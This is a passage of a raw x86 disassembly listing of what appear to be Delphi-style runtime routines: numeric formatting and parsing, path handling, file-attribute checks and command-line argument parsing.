  40636e:	7c 1f                	jl     0x40638f
  406370:	bf 04 00 00 00       	mov    $0x4,%edi
  406375:	41                   	inc    %ecx
  406376:	2d 00 00 64 a7       	sub    $0xa7640000,%eax
  40637b:	81 da b3 b6 e0 0d    	sbb    $0xde0b6b3,%edx
  406381:	73 f2                	jae    0x406375
  406383:	49                   	dec    %ecx
  406384:	05 00 00 64 a7       	add    $0xa7640000,%eax
  406389:	81 d2 b3 b6 e0 0d    	adc    $0xde0b6b3,%edx
  40638f:	89 45 f0             	mov    %eax,-0x10(%ebp)
  406392:	89 55 f4             	mov    %edx,-0xc(%ebp)
  406395:	df 6d f0             	fildll -0x10(%ebp)
  406398:	8b d7                	mov    %edi,%edx
  40639a:	b8 04 00 00 00       	mov    $0x4,%eax
  40639f:	2b c2                	sub    %edx,%eax
  4063a1:	74 07                	je     0x4063aa
  4063a3:	da 34 85 68 5c 40 00 	fidivl 0x405c68(,%eax,4)
  4063aa:	df 75 e6             	fbstp  -0x1a(%ebp)
  4063ad:	8d 7b 03             	lea    0x3(%ebx),%edi
  4063b0:	9b                   	fwait
  4063b1:	0b c9                	or     %ecx,%ecx
  4063b3:	75 1b                	jne    0x4063d0
  4063b5:	b9 09 00 00 00       	mov    $0x9,%ecx
  4063ba:	8a 44 0d e5          	mov    -0x1b(%ebp,%ecx,1),%al
  4063be:	8a e0                	mov    %al,%ah
  4063c0:	c0 e8 04             	shr    $0x4,%al
  4063c3:	75 1e                	jne    0x4063e3
  4063c5:	8a c4                	mov    %ah,%al
  4063c7:	24 0f                	and    $0xf,%al
  4063c9:	75 1f                	jne    0x4063ea
  4063cb:	49                   	dec    %ecx
  4063cc:	75 ec                	jne    0x4063ba
  4063ce:	eb 39                	jmp    0x406409
  4063d0:	8a c1                	mov    %cl,%al
  4063d2:	04 30                	add    $0x30,%al
  4063d4:	aa                   	stos   %al,%es:(%edi)
  4063d5:	b9 09 00 00 00       	mov    $0x9,%ecx
  4063da:	8a 44 0d e5          	mov    -0x1b(%ebp,%ecx,1),%al
  4063de:	8a e0                	mov    %al,%ah
  4063e0:	c0 e8 04             	shr    $0x4,%al
  4063e3:	04 30                	add    $0x30,%al
  4063e5:	aa                   	stos   %al,%es:(%edi)
  4063e6:	8a c4                	mov    %ah,%al
  4063e8:	24 0f                	and    $0xf,%al
  4063ea:	04 30                	add    $0x30,%al
  4063ec:	aa                   	stos   %al,%es:(%edi)
  4063ed:	49                   	dec    %ecx
  4063ee:	75 ea                	jne    0x4063da
  4063f0:	8b c7                	mov    %edi,%eax
  4063f2:	8d 4c 13 03          	lea    0x3(%ebx,%edx,1),%ecx
  4063f6:	2b c1                	sub    %ecx,%eax
  4063f8:	c6 07 00             	movb   $0x0,(%edi)
  4063fb:	4f                   	dec    %edi
  4063fc:	80 3f 30             	cmpb   $0x30,(%edi)
  4063ff:	74 f7                	je     0x4063f8
  406401:	8b 56 04             	mov    0x4(%esi),%edx
  406404:	c1 ea 1f             	shr    $0x1f,%edx
  406407:	eb 07                	jmp    0x406410
  406409:	33 c0                	xor    %eax,%eax
  40640b:	33 d2                	xor    %edx,%edx
  40640d:	88 43 03             	mov    %al,0x3(%ebx)
  406410:	66 89 03             	mov    %ax,(%ebx)
  406413:	88 53 02             	mov    %dl,0x2(%ebx)
  406416:	c3                   	ret
  406417:	55                   	push   %ebp
  406418:	8b ec                	mov    %esp,%ebp
  40641a:	83 ec 06             	sub    $0x6,%esp
  40641d:	57                   	push   %edi
  40641e:	56                   	push   %esi
  40641f:	53                   	push   %ebx
  406420:	8b f0                	mov    %eax,%esi
  406422:	8b fa                	mov    %edx,%edi
  406424:	8b d9                	mov    %ecx,%ebx
  406426:	9b d9 7d fa          	fstcw  -0x6(%ebp)
  40642a:	9b db e2             	fclex
  40642d:	d9 2d 86 5c 40 00    	fldcw  0x405c86
  406433:	d9 ee                	fldz
  406435:	e8 88 00 00 00       	call   0x4064c2
  40643a:	8a 3e                	mov    (%esi),%bh
  40643c:	80 ff 2b             	cmp    $0x2b,%bh
  40643f:	74 05                	je     0x406446
  406441:	80 ff 2d             	cmp    $0x2d,%bh
  406444:	75 01                	jne    0x406447
  406446:	46                   	inc    %esi
  406447:	8b ce                	mov    %esi,%ecx
  406449:	e8 7f 00 00 00       	call   0x4064cd
  40644e:	33 d2                	xor    %edx,%edx
  406450:	8a 06                	mov    (%esi),%al
  406452:	3a 05 9b b4 40 00    	cmp    0x40b49b,%al
  406458:	75 08                	jne    0x406462
  40645a:	46                   	inc    %esi
  40645b:	e8 6d 00 00 00       	call   0x4064cd
  406460:	f7 da                	neg    %edx
  406462:	3b ce                	cmp    %esi,%ecx
  406464:	74 4a                	je     0x4064b0
  406466:	8a 06                	mov    (%esi),%al
  406468:	24 df                	and    $0xdf,%al
  40646a:	3c 45                	cmp    $0x45,%al
  40646c:	75 0a                	jne    0x406478
  40646e:	46                   	inc    %esi
  40646f:	52                   	push   %edx
  406470:	e8 74 00 00 00       	call   0x4064e9
  406475:	58                   	pop    %eax
  406476:	03 d0                	add    %eax,%edx
  406478:	e8 45 00 00 00       	call   0x4064c2
  40647d:	80 3e 00             	cmpb   $0x0,(%esi)
  406480:	75 2e                	jne    0x4064b0
  406482:	8b c2                	mov    %edx,%eax
  406484:	80 fb 01             	cmp    $0x1,%bl
  406487:	75 03                	jne    0x40648c
  406489:	83 c0 04             	add    $0x4,%eax
  40648c:	e8 83 db ff ff       	call   0x404014
  406491:	80 ff 2d             	cmp    $0x2d,%bh
  406494:	75 02                	jne    0x406498
  406496:	d9 e0                	fchs
  406498:	80 fb 00             	cmp    $0x0,%bl
  40649b:	74 04                	je     0x4064a1
  40649d:	df 3f                	fistpll (%edi)
  40649f:	eb 02                	jmp    0x4064a3
  4064a1:	db 3f                	fstpt  (%edi)
  4064a3:	9b df e0             	fstsw  %ax
  4064a6:	66 a9 09 00          	test   $0x9,%ax
  4064aa:	75 06                	jne    0x4064b2
  4064ac:	b0 01                	mov    $0x1,%al
  4064ae:	eb 04                	jmp    0x4064b4
  4064b0:	dd d8                	fstp   %st(0)
  4064b2:	33 c0                	xor    %eax,%eax
  4064b4:	9b db e2             	fclex
  4064b7:	d9 6d fa             	fldcw  -0x6(%ebp)
  4064ba:	9b                   	fwait
  4064bb:	5b                   	pop    %ebx
  4064bc:	5e                   	pop    %esi
  4064bd:	5f                   	pop    %edi
  4064be:	8b e5                	mov    %ebp,%esp
  4064c0:	5d                   	pop    %ebp
  4064c1:	c3                   	ret
  4064c2:	ac                   	lods   %ds:(%esi),%al
  4064c3:	0a c0                	or     %al,%al
  4064c5:	74 04                	je     0x4064cb
  4064c7:	3c 20                	cmp    $0x20,%al
  4064c9:	74 f7                	je     0x4064c2
  4064cb:	4e                   	dec    %esi
  4064cc:	c3                   	ret
  4064cd:	33 c0                	xor    %eax,%eax
  4064cf:	33 d2                	xor    %edx,%edx
  4064d1:	ac                   	lods   %ds:(%esi),%al
  4064d2:	2c 3a                	sub    $0x3a,%al
  4064d4:	04 0a                	add    $0xa,%al
  4064d6:	73 0f                	jae    0x4064e7
  4064d8:	da 0d 6c 5c 40 00    	fimull 0x405c6c
  4064de:	89 45 fc             	mov    %eax,-0x4(%ebp)
  4064e1:	da 45 fc             	fiaddl -0x4(%ebp)
  4064e4:	42                   	inc    %edx
  4064e5:	eb ea                	jmp    0x4064d1
  4064e7:	4e                   	dec    %esi
  4064e8:	c3                   	ret
  4064e9:	33 c0                	xor    %eax,%eax
  4064eb:	33 d2                	xor    %edx,%edx
  4064ed:	8a 0e                	mov    (%esi),%cl
  4064ef:	80 f9 2b             	cmp    $0x2b,%cl
  4064f2:	74 05                	je     0x4064f9
  4064f4:	80 f9 2d             	cmp    $0x2d,%cl
  4064f7:	75 01                	jne    0x4064fa
  4064f9:	46                   	inc    %esi
  4064fa:	8a 06                	mov    (%esi),%al
  4064fc:	2c 3a                	sub    $0x3a,%al
  4064fe:	04 0a                	add    $0xa,%al
  406500:	73 0e                	jae    0x406510
  406502:	46                   	inc    %esi
  406503:	6b d2 0a             	imul   $0xa,%edx,%edx
  406506:	03 d0                	add    %eax,%edx
  406508:	81 fa f4 01 00 00    	cmp    $0x1f4,%edx
  40650e:	72 ea                	jb     0x4064fa
  406510:	80 f9 2d             	cmp    $0x2d,%cl
  406513:	75 02                	jne    0x406517
  406515:	f7 da                	neg    %edx
  406517:	c3                   	ret
  406518:	55                   	push   %ebp
  406519:	8b ec                	mov    %esp,%ebp
  40651b:	53                   	push   %ebx
  40651c:	56                   	push   %esi
  40651d:	57                   	push   %edi
  40651e:	33 c0                	xor    %eax,%eax
  406520:	55                   	push   %ebp
  406521:	68 4e 65 40 00       	push   $0x40654e
  406526:	64 ff 30             	push   %fs:(%eax)
  406529:	64 89 20             	mov    %esp,%fs:(%eax)
  40652c:	e8 c7 f6 ff ff       	call   0x405bf8
  406531:	e8 9a ec ff ff       	call   0x4051d0
  406536:	e8 d9 ed ff ff       	call   0x405314
  40653b:	e8 04 f7 ff ff       	call   0x405c44
  406540:	33 c0                	xor    %eax,%eax
  406542:	5a                   	pop    %edx
  406543:	59                   	pop    %ecx
  406544:	59                   	pop    %ecx
  406545:	64 89 10             	mov    %edx,%fs:(%eax)
  406548:	68 55 65 40 00       	push   $0x406555
  40654d:	c3                   	ret
  40654e:	e9 a9 c8 ff ff       	jmp    0x402dfc
  406553:	eb f8                	jmp    0x40654d
  406555:	5f                   	pop    %edi
  406556:	5e                   	pop    %esi
  406557:	5b                   	pop    %ebx
  406558:	5d                   	pop    %ebp
  406559:	c3                   	ret
  40655a:	8b c0                	mov    %eax,%eax
  40655c:	ff 25 44 c2 40 00    	jmp    *0x40c244
  406562:	8b c0                	mov    %eax,%eax
  406564:	e8 f3 ff ff ff       	call   0x40655c
  406569:	c3                   	ret
  40656a:	8b c0                	mov    %eax,%eax
  40656c:	8b 48 04             	mov    0x4(%eax),%ecx
  40656f:	3b 4a 04             	cmp    0x4(%edx),%ecx
  406572:	77 0c                	ja     0x406580
  406574:	72 0e                	jb     0x406584
  406576:	8b 08                	mov    (%eax),%ecx
  406578:	3b 0a                	cmp    (%edx),%ecx
  40657a:	77 04                	ja     0x406580
  40657c:	72 06                	jb     0x406584
  40657e:	eb 08                	jmp    0x406588
  406580:	31 c0                	xor    %eax,%eax
  406582:	40                   	inc    %eax
  406583:	c3                   	ret
  406584:	83 c8 ff             	or     $0xffffffff,%eax
  406587:	c3                   	ret
  406588:	31 c0                	xor    %eax,%eax
  40658a:	c3                   	ret
  40658b:	90                   	nop
  40658c:	01 10                	add    %edx,(%eax)
  40658e:	83 50 04 00          	adcl   $0x0,0x4(%eax)
  406592:	c3                   	ret
  406593:	90                   	nop
  406594:	53                   	push   %ebx
  406595:	56                   	push   %esi
  406596:	8b f2                	mov    %edx,%esi
  406598:	8b d8                	mov    %eax,%ebx
  40659a:	85 db                	test   %ebx,%ebx
  40659c:	74 22                	je     0x4065c0
  40659e:	8b c3                	mov    %ebx,%eax
  4065a0:	e8 97 01 00 00       	call   0x40673c
  4065a5:	8a 00                	mov    (%eax),%al
  4065a7:	2c 2f                	sub    $0x2f,%al
  4065a9:	74 15                	je     0x4065c0
  4065ab:	2c 2d                	sub    $0x2d,%al
  4065ad:	74 11                	je     0x4065c0
  4065af:	8b c6                	mov    %esi,%eax
  4065b1:	b9 d4 65 40 00       	mov    $0x4065d4,%ecx
  4065b6:	8b d3                	mov    %ebx,%edx
  4065b8:	e8 83 cd ff ff       	call   0x403340
  4065bd:	5e                   	pop    %esi
  4065be:	5b                   	pop    %ebx
  4065bf:	c3                   	ret
  4065c0:	8b c6                	mov    %esi,%eax
  4065c2:	8b d3                	mov    %ebx,%edx
  4065c4:	e8 63 cc ff ff       	call   0x40322c
  4065c9:	5e                   	pop    %esi
  4065ca:	5b                   	pop    %ebx
  4065cb:	c3                   	ret
  4065cc:	ff                   	(bad)
  4065cd:	ff                   	(bad)
  4065ce:	ff                   	(bad)
  4065cf:	ff 01                	incl   (%ecx)
  4065d1:	00 00                	add    %al,(%eax)
  4065d3:	00 5c 00 00          	add    %bl,0x0(%eax,%eax,1)
  4065d7:	00 53 56             	add    %dl,0x56(%ebx)
  4065da:	8b f2                	mov    %edx,%esi
  4065dc:	8b d8                	mov    %eax,%ebx
  4065de:	8a 44 33 ff          	mov    -0x1(%ebx,%esi,1),%al
  4065e2:	50                   	push   %eax
  4065e3:	e8 ac de ff ff       	call   0x404494
  4065e8:	85 c0                	test   %eax,%eax
  4065ea:	74 13                	je     0x4065ff
  4065ec:	8b c3                	mov    %ebx,%eax
  4065ee:	e8 01 cd ff ff       	call   0x4032f4
  4065f3:	3b f0                	cmp    %eax,%esi
  4065f5:	7d 08                	jge    0x4065ff
  4065f7:	b8 02 00 00 00       	mov    $0x2,%eax
  4065fc:	5e                   	pop    %esi
  4065fd:	5b                   	pop    %ebx
  4065fe:	c3                   	ret
  4065ff:	b8 01 00 00 00       	mov    $0x1,%eax
  406604:	5e                   	pop    %esi
  406605:	5b                   	pop    %ebx
  406606:	c3                   	ret
  406607:	90                   	nop
  406608:	53                   	push   %ebx
  406609:	56                   	push   %esi
  40660a:	57                   	push   %edi
  40660b:	55                   	push   %ebp
  40660c:	51                   	push   %ecx
  40660d:	88 14 24             	mov    %dl,(%esp)
  406610:	8b f0                	mov    %eax,%esi
  406612:	8b c6                	mov    %esi,%eax
  406614:	e8 db cc ff ff       	call   0x4032f4
  406619:	8b f8                	mov    %eax,%edi
  40661b:	83 ff 02             	cmp    $0x2,%edi
  40661e:	7c 59                	jl     0x406679
  406620:	8a 06                	mov    (%esi),%al
  406622:	2c 2f                	sub    $0x2f,%al
  406624:	74 04                	je     0x40662a
  406626:	2c 2d                	sub    $0x2d,%al
  406628:	75 4f                	jne    0x406679
  40662a:	8a 46 01             	mov    0x1(%esi),%al
  40662d:	2c 2f                	sub    $0x2f,%al
  40662f:	74 04                	je     0x406635
  406631:	2c 2d                	sub    $0x2d,%al
  406633:	75 44                	jne    0x406679
  406635:	bb 03 00 00 00       	mov    $0x3,%ebx
  40663a:	33 ed                	xor    %ebp,%ebp
  40663c:	3b fb                	cmp    %ebx,%edi
  40663e:	7c 34                	jl     0x406674
  406640:	8a 44 1e ff          	mov    -0x1(%esi,%ebx,1),%al
  406644:	2c 2f                	sub    $0x2f,%al
  406646:	74 04                	je     0x40664c
  406648:	2c 2d                	sub    $0x2d,%al
  40664a:	75 19                	jne    0x406665
  40664c:	45                   	inc    %ebp
  40664d:	83 fd 02             	cmp    $0x2,%ebp
  406650:	7d 22                	jge    0x406674
  406652:	43                   	inc    %ebx
  406653:	3b fb                	cmp    %ebx,%edi
  406655:	7c 19                	jl     0x406670
  406657:	8a 44 1e ff          	mov    -0x1(%esi,%ebx,1),%al
  40665b:	2c 2f                	sub    $0x2f,%al
  40665d:	74 f3                	je     0x406652
  40665f:	2c 2d                	sub    $0x2d,%al
  406661:	74 ef                	je     0x406652
  406663:	eb 0b                	jmp    0x406670
  406665:	8b d3                	mov    %ebx,%edx
  406667:	8b c6                	mov    %esi,%eax
  406669:	e8 6a ff ff ff       	call   0x4065d8
  40666e:	03 d8                	add    %eax,%ebx
  406670:	3b fb                	cmp    %ebx,%edi
  406672:	7d cc                	jge    0x406640
  406674:	8b c3                	mov    %ebx,%eax
  406676:	48                   	dec    %eax
  406677:	eb 5e                	jmp    0x4066d7
  406679:	83 ff 01             	cmp    $0x1,%edi
  40667c:	7c 1b                	jl     0x406699
  40667e:	8a 06                	mov    (%esi),%al
  406680:	2c 2f                	sub    $0x2f,%al
  406682:	74 04                	je     0x406688
  406684:	2c 2d                	sub    $0x2d,%al
  406686:	75 11                	jne    0x406699
  406688:	80 3c 24 00          	cmpb   $0x0,(%esp)
  40668c:	74 07                	je     0x406695
  40668e:	b8 01 00 00 00       	mov    $0x1,%eax
  406693:	eb 42                	jmp    0x4066d7
  406695:	33 c0                	xor    %eax,%eax
  406697:	eb 3e                	jmp    0x4066d7
  406699:	85 ff                	test   %edi,%edi
  40669b:	7e 38                	jle    0x4066d5
  40669d:	ba 01 00 00 00       	mov    $0x1,%edx
  4066a2:	8b c6                	mov    %esi,%eax
  4066a4:	e8 2f ff ff ff       	call   0x4065d8
  4066a9:	8b d8                	mov    %eax,%ebx
  4066ab:	43                   	inc    %ebx
  4066ac:	3b fb                	cmp    %ebx,%edi
  4066ae:	7c 25                	jl     0x4066d5
  4066b0:	80 7c 1e ff 3a       	cmpb   $0x3a,-0x1(%esi,%ebx,1)
  4066b5:	75 1e                	jne    0x4066d5
  4066b7:	80 3c 24 00          	cmpb   $0x0,(%esp)
  4066bb:	74 14                	je     0x4066d1
  4066bd:	3b fb                	cmp    %ebx,%edi
  4066bf:	7e 10                	jle    0x4066d1
  4066c1:	8a 04 1e             	mov    (%esi,%ebx,1),%al
  4066c4:	2c 2f                	sub    $0x2f,%al
  4066c6:	74 04                	je     0x4066cc
  4066c8:	2c 2d                	sub    $0x2d,%al
  4066ca:	75 05                	jne    0x4066d1
  4066cc:	8d 43 01             	lea    0x1(%ebx),%eax
  4066cf:	eb 06                	jmp    0x4066d7
  4066d1:	8b c3                	mov    %ebx,%eax
  4066d3:	eb 02                	jmp    0x4066d7
  4066d5:	33 c0                	xor    %eax,%eax
  4066d7:	5a                   	pop    %edx
  4066d8:	5d                   	pop    %ebp
  4066d9:	5f                   	pop    %edi
  4066da:	5e                   	pop    %esi
  4066db:	5b                   	pop    %ebx
  4066dc:	c3                   	ret
  4066dd:	8d 40 00             	lea    0x0(%eax),%eax
  4066e0:	53                   	push   %ebx
  4066e1:	56                   	push   %esi
  4066e2:	57                   	push   %edi
  4066e3:	81 c4 04 f0 ff ff    	add    $0xfffff004,%esp
  4066e9:	50                   	push   %eax
  4066ea:	83 c4 fc             	add    $0xfffffffc,%esp
  4066ed:	8b fa                	mov    %edx,%edi
  4066ef:	8b f0                	mov    %eax,%esi
  4066f1:	54                   	push   %esp
  4066f2:	8d 44 24 08          	lea    0x8(%esp),%eax
  4066f6:	50                   	push   %eax
  4066f7:	68 00 10 00 00       	push   $0x1000
  4066fc:	8b c6                	mov    %esi,%eax
  4066fe:	e8 11 cd ff ff       	call   0x403414
  406703:	50                   	push   %eax
  406704:	e8 33 dd ff ff       	call   0x40443c
  406709:	89 c3                	mov    %eax,%ebx
  40670b:	85 db                	test   %ebx,%ebx
  40670d:	7e 17                	jle    0x406726
  40670f:	81 fb 00 10 00 00    	cmp    $0x1000,%ebx
  406715:	7d 0f                	jge    0x406726
  406717:	8d 54 24 04          	lea    0x4(%esp),%edx
  40671b:	8b c7                	mov    %edi,%eax
  40671d:	8b cb                	mov    %ebx,%ecx
  40671f:	e8 54 cb ff ff       	call   0x403278
  406724:	eb 09                	jmp    0x40672f
  406726:	8b c7                	mov    %edi,%eax
  406728:	8b d6                	mov    %esi,%edx
  40672a:	e8 fd ca ff ff       	call   0x40322c
  40672f:	81 c4 04 10 00 00    	add    $0x1004,%esp
  406735:	5f                   	pop    %edi
  406736:	5e                   	pop    %esi
  406737:	5b                   	pop    %ebx
  406738:	c3                   	ret
  406739:	8d 40 00             	lea    0x0(%eax),%eax
  40673c:	53                   	push   %ebx
  40673d:	8b d8                	mov    %eax,%ebx
  40673f:	85 db                	test   %ebx,%ebx
  406741:	75 04                	jne    0x406747
  406743:	33 c0                	xor    %eax,%eax
  406745:	5b                   	pop    %ebx
  406746:	c3                   	ret
  406747:	8b c3                	mov    %ebx,%eax
  406749:	e8 a6 cb ff ff       	call   0x4032f4
  40674e:	8d 04 03             	lea    (%ebx,%eax,1),%eax
  406751:	50                   	push   %eax
  406752:	53                   	push   %ebx
  406753:	e8 cc dd ff ff       	call   0x404524
  406758:	5b                   	pop    %ebx
  406759:	c3                   	ret
  40675a:	8b c0                	mov    %eax,%eax
  40675c:	53                   	push   %ebx
  40675d:	56                   	push   %esi
  40675e:	57                   	push   %edi
  40675f:	55                   	push   %ebp
  406760:	8b ea                	mov    %edx,%ebp
  406762:	8b f0                	mov    %eax,%esi
  406764:	b2 01                	mov    $0x1,%dl
  406766:	8b c6                	mov    %esi,%eax
  406768:	e8 9b fe ff ff       	call   0x406608
  40676d:	8b f8                	mov    %eax,%edi
  40676f:	8b c6                	mov    %esi,%eax
  406771:	e8 7e cb ff ff       	call   0x4032f4
  406776:	8b d8                	mov    %eax,%ebx
  406778:	eb 01                	jmp    0x40677b
  40677a:	4b                   	dec    %ebx
  40677b:	3b fb                	cmp    %ebx,%edi
  40677d:	7d 14                	jge    0x406793
  40677f:	8d 04 1e             	lea    (%esi,%ebx,1),%eax
  406782:	50                   	push   %eax
  406783:	56                   	push   %esi
  406784:	e8 9b dd ff ff       	call   0x404524
  406789:	8a 00                	mov    (%eax),%al
  40678b:	2c 2f                	sub    $0x2f,%al
  40678d:	74 eb                	je     0x40677a
  40678f:	2c 2d                	sub    $0x2d,%al
  406791:	74 e7                	je     0x40677a
  406793:	8b c6                	mov    %esi,%eax
  406795:	e8 5a cb ff ff       	call   0x4032f4
  40679a:	3b d8                	cmp    %eax,%ebx
  40679c:	75 0b                	jne    0x4067a9
  40679e:	8b c5                	mov    %ebp,%eax
  4067a0:	8b d6                	mov    %esi,%edx
  4067a2:	e8 85 ca ff ff       	call   0x40322c
  4067a7:	eb 0f                	jmp    0x4067b8
  4067a9:	55                   	push   %ebp
  4067aa:	8b cb                	mov    %ebx,%ecx
  4067ac:	ba 01 00 00 00       	mov    $0x1,%edx
  4067b1:	8b c6                	mov    %esi,%eax
  4067b3:	e8 9c cc ff ff       	call   0x403454
  4067b8:	5d                   	pop    %ebp
  4067b9:	5f                   	pop    %edi
  4067ba:	5e                   	pop    %esi
  4067bb:	5b                   	pop    %ebx
  4067bc:	c3                   	ret
  4067bd:	8d 40 00             	lea    0x0(%eax),%eax
  4067c0:	55                   	push   %ebp
  4067c1:	8b ec                	mov    %esp,%ebp
  4067c3:	6a 00                	push   $0x0
  4067c5:	53                   	push   %ebx
  4067c6:	56                   	push   %esi
  4067c7:	57                   	push   %edi
  4067c8:	8b d8                	mov    %eax,%ebx
  4067ca:	33 c0                	xor    %eax,%eax
  4067cc:	55                   	push   %ebp
  4067cd:	68 08 68 40 00       	push   $0x406808
  4067d2:	64 ff 30             	push   %fs:(%eax)
  4067d5:	64 89 20             	mov    %esp,%fs:(%eax)
  4067d8:	8d 55 fc             	lea    -0x4(%ebp),%edx
  4067db:	8b c3                	mov    %ebx,%eax
  4067dd:	e8 7a ff ff ff       	call   0x40675c
  4067e2:	8b 45 fc             	mov    -0x4(%ebp),%eax
  4067e5:	e8 2a cc ff ff       	call   0x403414
  4067ea:	50                   	push   %eax
  4067eb:	e8 3c dc ff ff       	call   0x40442c
  4067f0:	8b d8                	mov    %eax,%ebx
  4067f2:	33 c0                	xor    %eax,%eax
  4067f4:	5a                   	pop    %edx
  4067f5:	59                   	pop    %ecx
  4067f6:	59                   	pop    %ecx
  4067f7:	64 89 10             	mov    %edx,%fs:(%eax)
  4067fa:	68 0f 68 40 00       	push   $0x40680f
  4067ff:	8d 45 fc             	lea    -0x4(%ebp),%eax
  406802:	e8 91 c9 ff ff       	call   0x403198
  406807:	c3                   	ret
  406808:	e9 ef c5 ff ff       	jmp    0x402dfc
  40680d:	eb f0                	jmp    0x4067ff
  40680f:	8b c3                	mov    %ebx,%eax
  406811:	5f                   	pop    %edi
  406812:	5e                   	pop    %esi
  406813:	5b                   	pop    %ebx
  406814:	59                   	pop    %ecx
  406815:	5d                   	pop    %ebp
  406816:	c3                   	ret
  406817:	90                   	nop
  406818:	e8 a3 ff ff ff       	call   0x4067c0
  40681d:	83 f8 ff             	cmp    $0xffffffff,%eax
  406820:	74 04                	je     0x406826
  406822:	a8 10                	test   $0x10,%al
  406824:	75 03                	jne    0x406829
  406826:	33 c0                	xor    %eax,%eax
  406828:	c3                   	ret
  406829:	b0 01                	mov    $0x1,%al
  40682b:	c3                   	ret
  40682c:	53                   	push   %ebx
  40682d:	8b d8                	mov    %eax,%ebx
  40682f:	8b c3                	mov    %ebx,%eax
  406831:	e8 8a ff ff ff       	call   0x4067c0
  406836:	40                   	inc    %eax
  406837:	0f 95 c0             	setne  %al
  40683a:	5b                   	pop    %ebx
  40683b:	c3                   	ret
  40683c:	53                   	push   %ebx
  40683d:	56                   	push   %esi
  40683e:	57                   	push   %edi
  40683f:	8b da                	mov    %edx,%ebx
  406841:	8b f8                	mov    %eax,%edi
  406843:	8b c3                	mov    %ebx,%eax
  406845:	ba ff 00 00 00       	mov    $0xff,%edx
  40684a:	e8 a1 cc ff ff       	call   0x4034f0
  40684f:	8b 03                	mov    (%ebx),%eax
  406851:	e8 9e ca ff ff       	call   0x4032f4
  406856:	50                   	push   %eax
  406857:	8b 03                	mov    (%ebx),%eax
  406859:	e8 b6 cb ff ff       	call   0x403414
  40685e:	50                   	push   %eax
  40685f:	8b c7                	mov    %edi,%eax
  406861:	e8 ae cb ff ff       	call   0x403414
  406866:	50                   	push   %eax
  406867:	e8 b0 db ff ff       	call   0x40441c
  40686c:	8b f0                	mov    %eax,%esi
  40686e:	85 f6                	test   %esi,%esi
  406870:	75 09                	jne    0x40687b
  406872:	8b c3                	mov    %ebx,%eax
  406874:	e8 1f c9 ff ff       	call   0x403198
  406879:	eb 0d                	jmp    0x406888
  40687b:	8b c3                	mov    %ebx,%eax
  40687d:	8b d6                	mov    %esi,%edx
  40687f:	e8 58 03 00 00       	call   0x406bdc
  406884:	84 c0                	test   %al,%al
  406886:	74 c7                	je     0x40684f
  406888:	5f                   	pop    %edi
  406889:	5e                   	pop    %esi
  40688a:	5b                   	pop    %ebx
  40688b:	c3                   	ret
  40688c:	53                   	push   %ebx
  40688d:	56                   	push   %esi
  40688e:	8b f0                	mov    %eax,%esi
  406890:	e8 77 db ff ff       	call   0x40440c
  406895:	8b d8                	mov    %eax,%ebx
  406897:	33 c0                	xor    %eax,%eax
  406899:	8a 13                	mov    (%ebx),%dl
  40689b:	80 ea 01             	sub    $0x1,%dl
  40689e:	72 17                	jb     0x4068b7
  4068a0:	80 ea 20             	sub    $0x20,%dl
  4068a3:	72 06                	jb     0x4068ab
  4068a5:	fe ca                	dec    %dl
  4068a7:	74 08                	je     0x4068b1
  4068a9:	eb 08                	jmp    0x4068b3
  4068ab:	84 c0                	test   %al,%al
  4068ad:	74 08                	je     0x4068b7
  4068af:	eb 02                	jmp    0x4068b3
  4068b1:	34 01                	xor    $0x1,%al
  4068b3:	43                   	inc    %ebx
  4068b4:	eb e3                	jmp    0x406899
  4068b6:	43                   	inc    %ebx
  4068b7:	8a 03                	mov    (%ebx),%al
  4068b9:	48                   	dec    %eax
  4068ba:	2c 20                	sub    $0x20,%al
  4068bc:	72 f8                	jb     0x4068b6
  4068be:	8b c6                	mov    %esi,%eax
  4068c0:	8b d3                	mov    %ebx,%edx
  4068c2:	e8 fd c9 ff ff       	call   0x4032c4
  4068c7:	5e                   	pop    %esi
  4068c8:	5b                   	pop    %ebx
  4068c9:	c3                   	ret
  4068ca:	8b c0                	mov    %eax,%eax
  4068cc:	55                   	push   %ebp
  4068cd:	8b ec                	mov    %esp,%ebp
  4068cf:	51                   	push   %ecx
  4068d0:	53                   	push   %ebx
  4068d1:	56                   	push   %esi
  4068d2:	57                   	push   %edi
  4068d3:	8b f1                	mov    %ecx,%esi
  4068d5:	89 55 fc             	mov    %edx,-0x4(%ebp)
  4068d8:	33 d2                	xor    %edx,%edx
  4068da:	89 16                	mov    %edx,(%esi)
  4068dc:	33 c9                	xor    %ecx,%ecx
  4068de:	eb 1c                	jmp    0x4068fc
  4068e0:	80 fa 22             	cmp    $0x22,%dl
  4068e3:	75 05                	jne    0x4068ea
  4068e5:	80 f1 01             	xor    $0x1,%cl
  4068e8:	eb 11                	jmp    0x4068fb
  4068ea:	83 7d fc 00          	cmpl   $0x0,-0x4(%ebp)
  4068ee:	74 09                	je     0x4068f9
  4068f0:	8b 1e                	mov    (%esi),%ebx
  4068f2:	8b 7d fc             	mov    -0x4(%ebp),%edi
  4068f5:	03 fb                	add    %ebx,%edi
  4068f7:	88 17                	mov    %dl,(%edi)
  4068f9:	ff 06                	incl   (%esi)
  4068fb:	40                   	inc    %eax
  4068fc:	8a 10                	mov    (%eax),%dl
  4068fe:	84 d2                	test   %dl,%dl
  406900:	74 0a                	je     0x40690c
  406902:	80 fa 20             	cmp    $0x20,%dl
  406905:	0f 97 c3             	seta   %bl
  406908:	0a d9                	or     %cl,%bl
  40690a:	75 d4                	jne    0x4068e0
  40690c:	5f                   	pop    %edi
  40690d:	5e                   	pop    %esi
  40690e:	5b                   	pop    %ebx
  40690f:	59                   	pop    %ecx
  406910:	5d                   	pop    %ebp
  406911:	c3                   	ret
  406912:	8b c0                	mov    %eax,%eax
  406914:	55                   	push   %ebp
  406915:	8b ec                	mov    %esp,%ebp
  406917:	83 c4 f8             	add    $0xfffffff8,%esp
  40691a:	53                   	push   %ebx
  40691b:	56                   	push   %esi
  40691c:	57                   	push   %edi
  40691d:	33 c9                	xor    %ecx,%ecx
  40691f:	89 4d f8             	mov    %ecx,-0x8(%ebp)
  406922:	8b f2                	mov    %edx,%esi
  406924:	8b d8                	mov    %eax,%ebx
  406926:	33 c0                	xor    %eax,%eax
  406928:	55                   	push   %ebp
  406929:	68 a0 69 40 00       	push   $0x4069a0
  40692e:	64 ff 30             	push   %fs:(%eax)
  406931:	64 89 20             	mov    %esp,%fs:(%eax)
  406934:	eb 01                	jmp    0x406937
  406936:	43                   	inc    %ebx
  406937:	8a 03                	mov    (%ebx),%al
  406939:	84 c0                	test   %al,%al
  40693b:	74 04                	je     0x406941
  40693d:	3c 20                	cmp    $0x20,%al
  40693f:	76 f5                	jbe    0x406936
